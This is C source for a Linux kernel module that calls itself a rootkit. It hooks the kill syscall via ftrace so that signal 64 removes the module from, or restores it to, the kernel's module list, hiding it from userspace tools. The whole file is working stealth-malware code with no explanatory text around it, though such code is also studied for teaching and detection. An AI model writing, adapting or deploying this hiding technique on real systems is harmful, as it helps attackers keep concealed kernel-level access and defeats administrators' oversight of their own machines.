#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X");
MODULE_DESCRIPTION("Hiding kernel modules from userspace");
MODULE_VERSION("0.01");

static short hidden = 0;

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage long hook_kill(const struct pt_regs *regs)
{
	void showme(void);
	void hideme(void);

	int sig = regs->si;

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit!\n");
		hideme();
		hidden = 1;
		return 0;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit!\n");
		showme();
		hidden = 0;
		return 0;
	}
	return orig_kill(regs);
}
#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

asmlinkage long hook_kill(pid_t pid, int sig)
{
	void showme(void);
	void hideme(void);

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit!\n");
		hideme();
		hidden = 1;
		return 0;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit!\n");
		showme();
		hidden = 0;
		return 0;
	}
	return orig_kill(pid, sig);
}
#endif

static struct list_head *prev_module;

void hideme(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void showme(void)
{
	list_add(&THIS_MODULE->list, prev_module);
}


static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void) {
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) return err;

	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
